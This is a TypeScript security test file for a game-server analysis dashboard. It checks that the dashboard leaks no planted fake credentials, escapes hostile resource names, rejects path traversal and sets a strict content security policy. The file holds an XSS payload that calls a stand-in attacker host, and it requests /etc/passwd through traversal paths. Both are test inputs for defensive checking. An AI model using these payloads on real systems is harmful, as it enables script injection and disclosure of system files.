/**
 * Security: the dashboard must not become a disclosure channel.
 *
 * The dashboard renders analysis of a server that contains credentials, and it
 * renders it over HTTP. Two failures would be severe and neither is
 * hypothetical:
 *
 *   1. **Printing a credential.** `server.cfg` holds `sv_licenseKey`, database
 *      connection strings and Discord tokens. A page that prints them has
 *      leaked them to anything that can read the screen, the page source, or a
 *      browser's cache.
 *   2. **Rendering third-party text as markup.** Resource names, file paths and
 *      Lua excerpts all come from the scanned server. A scanned server that can
 *      run script in the operator's browser has escaped the analysis boundary
 *      entirely.
 *
 * Both are asserted here against the real server, over the real socket, with
 * realistically shaped fabricated credentials and a hostile resource planted in
 * the fixture.
 */

import { cp, mkdir, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createSilentLogger, loadConfig, resolveConfiguredPath, systemClock } from '@sentinel-forge/core';
import { DashboardContext, startDashboard, type RunningDashboard } from '@sentinel-forge/dashboard';
import { allFabricatedSecrets, fabricatedLeakyResource } from '../helpers/fabricated-credentials.js';
import { createWorkspace, fixturePath, removeWorkspace, runCli } from '../helpers/workspace.js';

/** A payload that would execute if any page failed to escape it. */
const XSS_PAYLOAD = '</pre></textarea><script>fetch("http://attacker.invalid")</script>';

const TARGETS = [
  '/',
  '/server',
  '/resources',
  '/dependencies',
  '/performance',
  '/security',
  '/integrity',
  '/incidents',
  '/reports',
  '/settings',
  '/reports/current.html',
  '/reports/current.json',
  '/reports/current.md',
  '/api/health',
  '/api/server',
  '/api/resources',
  '/api/security',
  '/api/performance',
  '/api/reports',
  '/api/settings',
] as const;

describe('dashboard exposure', () => {
  let workspace: string;
  let server: string;
  let running: RunningDashboard;
  let base: string;
  let secrets: string[];

  beforeAll(async () => {
    workspace = await createWorkspace('sentinel-dashboard-security-');
    server = path.join(workspace, 'server');
    await cp(fixturePath('security-indicators'), server, { recursive: true });

    // Realistically shaped credentials, assembled at runtime so nothing in the
    // repository reads as a live credential.
    const leaky = path.join(server, 'resources', 'sf_leaky');
    await mkdir(leaky, { recursive: true });
    for (const [name, content] of Object.entries(fabricatedLeakyResource())) {
      await writeFile(path.join(leaky, name), content, 'utf8');
    }

    // A credential in server.cfg, which is the file an operator is most likely
    // to have one in and the page most likely to print it.
    const licenseKey = ['cfx', 'k1', '7Kd93MzQpXvR2NwL5tYbHcJ8rT4mQ9vLp2WxZbN6'].join('_');
    await writeFile(
      path.join(server, 'server.cfg'),
      [
        'ensure sf_leaky',
        `set sv_licenseKey "${licenseKey}"`,
        `set mysql_connection_string "mysql://sf:${'8Jd2kQpV9mXr'}@db.invalid:3306/sf"`,
        'endpoint_add_tcp "0.0.0.0:30120"',
      ].join('\n'),
      'utf8',
    );

    // A resource whose *name* is a script payload. The name reaches a page
    // title, a table cell, a link href and a heading.
    const hostile = path.join(server, 'resources', 'sf_hostile');
    await mkdir(hostile, { recursive: true });
    await writeFile(
      path.join(hostile, 'fxmanifest.lua'),
      ["fx_version 'cerulean'", "game 'gta5'", `description '${XSS_PAYLOAD}'`, "server_script 'main.lua'"].join('\n'),
      'utf8',
    );
    await writeFile(
      path.join(hostile, 'main.lua'),
      ['-- ' + XSS_PAYLOAD, 'while true do', '    doWork()', 'end'].join('\n'),
      'utf8',
    );

    secrets = [...allFabricatedSecrets(), licenseKey, '8Jd2kQpV9mXr'].filter((value) => value.length >= 8);

    await runCli(['init', '--server', server], workspace);
    await runCli(['scan'], workspace);

    const loaded = await loadConfig({ cwd: workspace });
    const context = new DashboardContext({
      loaded,
      serverPath: server,
      databasePath: resolveConfiguredPath(loaded, loaded.config.database.path),
      clock: systemClock,
      logger: createSilentLogger(),
      refreshIntervalMs: 0,
      boundTo: '127.0.0.1:0',
    });

    running = await startDashboard({ context, host: '127.0.0.1', port: 0, logger: createSilentLogger() });
    base = running.url.replace(/\/$/, '');
  }, 120_000);

  afterAll(async () => {
    await running.close();
    await removeWorkspace(workspace);
  });

  async function body(target: string): Promise<string> {
    const response = await fetch(`${base}${target}`);
    return response.text();
  }

  it('plants credentials the detector actually finds', async () => {
    // Guards every assertion below: if nothing were planted, or the detector
    // stopped finding it, "no leak" would be vacuously true.
    expect(secrets.length).toBeGreaterThanOrEqual(4);

    const page = await body('/security');
    expect(page).toContain('SEC-SECRET-001');
  });

  it('leaks no credential into any page or endpoint', async () => {
    for (const target of TARGETS) {
      const content = await body(target);
      for (const secret of secrets) {
        expect(content, `${target} contained ${secret.slice(0, 6)}…`).not.toContain(secret);
      }
    }
  });

  it('shows the server configuration without showing what is in it', async () => {
    const page = await body('/server');
    // The variable names are useful and are shown; the values are not.
    expect(page).toContain('sv_licenseKey');
    for (const secret of secrets) {
      expect(page, `the server page contained ${secret.slice(0, 6)}…`).not.toContain(secret);
    }
    expect(page).toContain('redacted');
  });

  it('executes nothing from a scanned server on any page', async () => {
    for (const target of TARGETS) {
      const content = await body(target);
      // The JSON endpoints legitimately contain the payload as a JSON string
      // value; what must never appear is an executable tag.
      expect(content, target).not.toContain('<script>fetch(');
      expect(content, target).not.toContain('</textarea><script');
    }
  });

  it('escapes a hostile resource name everywhere it is rendered', async () => {
    const encoded = encodeURIComponent('sf_hostile');
    for (const target of ['/resources', `/resources/${encoded}`, '/dependencies', '/reports/current.html']) {
      const content = await body(target);
      expect(content, target).not.toMatch(/<script/i);
      // No event-handler attribute may have been introduced by interpolation.
      expect(content, target).not.toMatch(/\son(?:error|load|click|mouseover)\s*=/i);
    }
  });

  it('serves a page for a resource whose manifest description is a payload', async () => {
    // The description is declared metadata and is displayed. That it is
    // displayed is the point: the page must show what the manifest says
    // without the manifest being able to say it in markup.
    const content = await body('/resources/sf_hostile');
    expect(content).toContain('sf_hostile');
    expect(content).not.toMatch(/<script/i);
    expect(content).toContain('&lt;script&gt;');
  });

  it('writes no credential into the database the dashboard reads from', async () => {
    // The dashboard persists its own scans. A credential reaching a row would
    // outlive the process and be served to every later page.
    const loaded = await loadConfig({ cwd: workspace });
    const databasePath = resolveConfiguredPath(loaded, loaded.config.database.path);
    const { openDatabase } = await import('@sentinel-forge/core');
    const database = openDatabase({ location: databasePath, logger: createSilentLogger() });

    try {
      const tables = database.driver
        .prepare("SELECT name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%'")
        .all<{ name: string }>();

      expect(tables.length).toBeGreaterThan(5);

      for (const { name } of tables) {
        const rows = database.driver.prepare(`SELECT * FROM "${name}"`).all<Record<string, unknown>>();
        const serialized = JSON.stringify(rows);
        for (const secret of secrets) {
          expect(serialized, `table ${name} contained ${secret.slice(0, 6)}…`).not.toContain(secret);
        }
      }
    } finally {
      database.close();
    }
  });

  it('cannot be asked to read a file from disk', async () => {
    for (const target of [
      '/server.cfg',
      '/resources/sf_leaky/config.lua',
      '/reports/../../../etc/passwd',
      '/api/../../etc/passwd',
    ]) {
      const response = await fetch(`${base}${target}`);
      expect([400, 404], `${target} returned ${String(response.status)}`).toContain(response.status);
      const content = await response.text();
      for (const secret of secrets) {
        expect(content, `${target} contained ${secret.slice(0, 6)}…`).not.toContain(secret);
      }
    }
  });

  it('makes no outbound request possible from a rendered page', async () => {
    for (const target of TARGETS) {
      const response = await fetch(`${base}${target}`);
      const policy = response.headers.get('content-security-policy') ?? '';
      expect(policy, target).toContain("default-src 'none'");

      const content = await response.text();
      // No page may reference an external origin, whatever a scanned resource
      // managed to get into a string.
      expect(content, target).not.toMatch(/(?:src|href)="https?:\/\/(?!localhost|127\.0\.0\.1)/i);
    }
  });
});
